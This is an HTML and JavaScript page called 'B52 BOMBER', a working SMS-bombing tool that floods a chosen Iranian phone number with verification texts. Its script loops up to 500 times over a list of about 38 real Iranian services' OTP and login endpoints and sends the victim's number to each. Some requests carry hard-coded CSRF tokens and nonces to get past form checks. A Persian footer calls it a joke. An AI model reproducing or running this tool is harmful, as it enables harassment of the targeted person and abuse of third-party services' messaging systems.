<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B52 BOMBER</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Material Icons -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            font-family: 'Roboto', sans-serif;
        }
        .container {
            max-width: 600px;
            margin-top: 50px;
        }
        .card {
            border: none;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            background-color: #ffffff;
        }
        .card-header {
            background-color: #6200ea;
            color: #ffffff;
            border-radius: 8px 8px 0 0;
            padding: 16px;
        }
        .btn-primary {
            background-color: #6200ea;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
        }
        .btn-primary:hover {
            background-color: #3700b3;
        }
        .form-control {
            border-radius: 4px;
            border: 1px solid #ddd;
            padding: 10px;
        }
        .form-control:focus {
            border-color: #6200ea;
            box-shadow: 0 0 0 2px rgba(98, 0, 234, 0.2);
        }
        .form-label {
            color: #333;
            font-weight: 500;
        }
        .output {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
            border: 1px solid #ddd;
            font-size: 14px;
            overflow-y: auto;
            max-height: 300px;
        }
        .success {
            color: #4caf50;
        }
        .error {
            color: #f44336;
        }
        .footer-text {
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- عنوان B52 BOMBER -->
        <h1 class="text-center mb-4" style="color: #6200ea;">B52 BOMBER</h1>

        <div class="card">
            <div class="card-header">
                <h4 class="card-title">SMS Sender - Material Design</h4>
            </div>
            <div class="card-body">
                <form id="smsForm">
                    <div class="mb-3">
                        <label for="phoneNumber" class="form-label">Phone Number</label>
                        <input type="text" class="form-control" id="phoneNumber" list="phoneBook" placeholder="+989123456789" required>
                        <!-- لیست دفتر تلفن -->
                        <datalist id="phoneBook">
                            <option value="+989111111111">Contact 1</option>
                            <option value="+989222222222">Contact 2</option>
                            <option value="+989333333333">Contact 3</option>
                            <option value="+989444444444">Contact 4</option>
                            <option value="+989555555555">Contact 5</option>
                        </datalist>
                    </div>
                    <div class="mb-3">
                        <label for="smsCount" class="form-label">Number of SMS (10 to 500)</label>
                        <select class="form-control" id="smsCount" required>
                            <!-- گزینه‌های 10 تا 500 با گام 10 -->
                            <option value="10">10</option>
                            <option value="20">20</option>
                            <option value="30">30</option>
                            <option value="40">40</option>
                            <option value="50">50</option>
                            <option value="60">60</option>
                            <option value="70">70</option>
                            <option value="80">80</option>
                            <option value="90">90</option>
                            <option value="100">100</option>
                            <option value="150">150</option>
                            <option value="200">200</option>
                            <option value="250">250</option>
                            <option value="300">300</option>
                            <option value="350">350</option>
                            <option value="400">400</option>
                            <option value="450">450</option>
                            <option value="500">500</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="sleepTime" class="form-label">Sleep Time (seconds)</label>
                        <select class="form-control" id="sleepTime" required>
                            <option value="0.1">0.1</option>
                            <option value="0.2">0.2</option>
                            <option value="0.3">0.3</option>
                            <option value="0.5">0.5</option>
                            <option value="1">1</option>
                            <option value="2">2</option>
                            <option value="5">5</option>
                            <option value="10">10</option>
                            <option value="20">20</option>
                            <option value="30">30</option>
                        </select>
                    </div>
                    <button type="submit" class="btn btn-primary">Send SMS</button>
                </form>
                <div id="output" class="output mt-3"></div>
            </div>
        </div>

        <!-- متن فارسی در پایین صفحه -->
        <div class="footer-text">
            این برنامه صرفاً برای شوخی و تفریح ساخته شده است و هیچ هدف دیگری ندارد. لطفاً از آن به‌صورت مسئولانه استفاده کنید.
        </div>
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>

    <script>
        // تابع بررسی و تبدیل شماره تلفن
        function isPhone(phone) {
            phone = phone.replace(/\s+/g, '').trim();
            if (/^\+989[0-9]{9}$/.test(phone)) {
                return phone;
            } else if (/^989[0-9]{9}$/.test(phone)) {
                return `+${phone}`;
            } else if (/^09[0-9]{9}$/.test(phone)) {
                return `+98${phone.slice(1)}`;
            } else if (/^9[0-9]{9}$/.test(phone)) {
                return `+98${phone}`;
            } else {
                return null;
            }
        }

        // تابع ارسال درخواست HTTP POST
        async function sendPostRequest(url, data) {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                return await response.json();
            } catch (error) {
                return { error: error.message };
            }
        }

        // تابع اصلی ارسال SMS
        async function sendSms(phone, smsCount, sleepTime) {
            const output = document.getElementById('output');
            output.innerHTML = `<p class="success">Sending ${smsCount} SMS to ${phone} with a sleep time of ${sleepTime} seconds...</p>`;

            // لیست API‌ها
            const apis = [
                { name: "Snapp", url: "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data: { cellphone: phone } },
                { name: "Gap", url: "https://core.gap.im/v1/user/add.json", data: { mobile: phone } },
                { name: "Tap30", url: "https://tap33.me/api/v2/user", data: { credential: { phoneNumber: `0${phone.split("+98")[1]}`, role: "PASSENGER" } } },
                { name: "Divar", url: "https://api.divar.ir/v5/auth/authenticate", data: { phone: phone.split("+98")[1] } },
                { name: "Torob", url: `https://api.torob.com/a/phone/send-pin/?phone_number=0${phone.split("+98")[1]}`, data: {} },
                { name: "SnapFood", url: "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", data: { cellphone: `0${phone.split("+98")[1]}` } },
                { name: "Sheypoor", url: "https://www.sheypoor.com/auth", data: { username: `0${phone.split("+98")[1]}` } },
                { name: "AliBaba", url: "https://ws.alibaba.ir/api/v3/account/mobile/otp", data: { phoneNumber: `0${phone.split("+98")[1]}` } },
                { name: "SnapMarket", url: `https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0${phone.split("+98")[1]}`, data: {} },
                { name: "Strip", url: "https://www.snapptrip.com/register", data: { mobile_phone: `0${phone.split("+98")[1]}`, country_code: "+98" } },
                { name: "DrDr", url: "https://drdr.ir/api/registerEnrollment/sendDisposableCode", data: { phoneNumber: phone, userType: "PATIENT" } },
                { name: "Filmnet", url: `https://api-v2.filmnet.ir/access-token/users/${phone}/otp`, data: {} },
                { name: "Itool", url: "https://app.itoll.ir/api/v1/auth/login", data: { mobile: phone } },
                { name: "AnarGift", url: "https://api.anargift.com/api/people/auth", data: { user: phone, app_id: 99 } },
                { name: "Azki", url: `https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_${phone}"%7D`, data: {} },
                { name: "Nobat", url: "https://nobat.ir/api/public/patient/login/phone", data: { mobile: phone } },
                { name: "BaniMode", url: "https://mobapi.banimode.com/api/v2/auth/request", data: { phone: `0${phone.split("+98")[1]}` } },
                { name: "Baskol", url: "https://www.buskool.com/send_verification_code", data: { phone: `0${phone.split("+98")[1]}` } },
                { name: "BaSalam", url: "https://api.basalam.com/user", data: { variables: { mobile: `0${phone.split("+98")[1]}` }, query: "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }" } },
                { name: "Ghabzino", url: "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", data: { Parameters: { ApplicationType: "Web", MobileNumber: `0${phone.split("+98")[1]}` } } },
                { name: "OfoghKourosh", url: "https://my.okcs.com/api/check-mobile", data: { mobile: `0${phone.split("+98")[1]}` } },
                { name: "Bimito", url: `https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220${phone.split("+98")[1]}%22%7D`, data: {} },
                { name: "GapFilm", url: "https://core.gapfilm.ir/api/v3.1/Account/Login", data: { Type: 3, Username: phone.split("+98")[1], SourceChannel: "GF_WebSite" } },
                { name: "BimitoVip", url: `https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220${phone.split("+98")[1]}%22%7D`, data: {} },
                { name: "SeebIrani", url: "https://sandbox.sibirani.ir/api/v1/user/invite", data: { username: `0${phone.split("+98")[1]}` } },
                { name: "Limome", url: "https://my.limoome.com/api/auth/login/otp", data: { mobileNumber: phone.split("+98")[1], country: "1" } },
                { name: "BinJo", url: `https://api.binjo.ir/api/panel/get_code/0${phone.split("+98")[1]}`, data: {} },
                { name: "Kilid", url: "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", data: { mobile: `0${phone.split("+98")[1]}` } },
                { name: "DideNegar", url: "https://www.didnegar.com/wp-admin/admin-ajax.php", data: { action: "digits_check_mob", countrycode: "+98", mobileNo: phone.split("+98")[1], csrf: "4c9ac22ff4", login: "1", username: "", email: "", captcha: "", captcha_ses: "", digits: "1", json: "1", whatsapp: "0", mobmail: `0${phone.split("+98")[1]}`, dig_otp: "", digits_login_remember_me: "1", dig_nounce: "4c9ac22ff4" } },
                { name: "NashrOlgoo", url: "https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", data: { contactInfo: { mobile: `0${phone.split("+98")[1]}`, agreementAccepted: "1", teachingFieldId: "1", eduGradeIds: { 7: "7" } }, submit_register: "1" } },
                { name: "Chamedoon", url: "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", data: { mobile: `0${phone.split("+98")[1]}`, origin: "/", referrer_id: null } },
                { name: "DrSaina", url: "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation", data: { __RequestVerificationToken: "CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg", noLayout: "False", action: "checkIfUserExistOrNot", lId: "", codeGuid: "00000000-0000-0000-0000-000000000000", PhoneNumber: `0${phone.split("+98")[1]}`, confirmCode: "", fullName: "", Password: "", Password2: "" } },
                { name: "See5", url: "https://crm.see5.net/api_ajax/sendotp.php", data: { mobile: `0${phone.split("+98")[1]}`, action: "sendsms" } },
                { name: "SimKhan", url: "https://www.simkhanapi.ir/api/users/registerV2", data: { mobileNumber: `0${phone.split("+98")[1]}`, ReSendSMS: false } },
                { name: "Lendo", url: "https://lendo.ir/register?", data: { _token: "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", mobile: `0${phone.split("+98")[1]}`, password: "ibvvb@3#9nc" } },
                { name: "PakhshShop", url: "https://www.pakhsh.shop/wp-admin/admin-ajax.php", data: { action: "digits_check_mob", countrycode: "+98", mobileNo: `0${phone.split("+98")[1]}`, csrf: "fdaa7fc8e6", login: "2", username: "", email: "", captcha: "", captcha_ses: "", json: "1", whatsapp: "0" } },
                { name: "MihanPezeshk", url: "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", data: { _token: "bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R", mobile: `0${phone.split("+98")[1]}`, recaptcha: "" } },
                { name: "HamrahMechanic", url: "https://www.hamrah-mechanic.com/api/v1/auth/login", data: { landingPageUrl: "https://www.hamrah-mechanic.com/", orderPageUrl: "https://www.hamrah-mechanic.com/membersignin/", phoneNumber: `0${phone.split("+98")[1]}`, prevDomainUrl: null, prevUrl: null, referrer: "https://www.google.com/" } }
            ];

            for (let i = 0; i < smsCount; i++) {
                for (const api of apis) {
                    const response = await sendPostRequest(api.url, api.data);
                    if (response.error) {
                        output.innerHTML += `<p class="error">${api.name} response (${i + 1}/${smsCount}): ${response.error}</p>`;
                    } else {
                        output.innerHTML += `<p class="success">${api.name} response (${i + 1}/${smsCount}): ${JSON.stringify(response)}</p>`;
                    }

                    // خواب بین درخواست‌ها
                    await new Promise(resolve => setTimeout(resolve, sleepTime * 1000));
                }
            }
        }

        // ارسال فرم
        document.getElementById('smsForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const phoneNumber = document.getElementById('phoneNumber').value;
            const smsCount = parseInt(document.getElementById('smsCount').value);
            const sleepTime = parseFloat(document.getElementById('sleepTime').value);

            const formattedPhone = isPhone(phoneNumber);
            if (!formattedPhone) {
                alert("Invalid phone number!");
                return;
            }

            await sendSms(formattedPhone, smsCount, sleepTime);
        });
    </script>
</body>
</html>
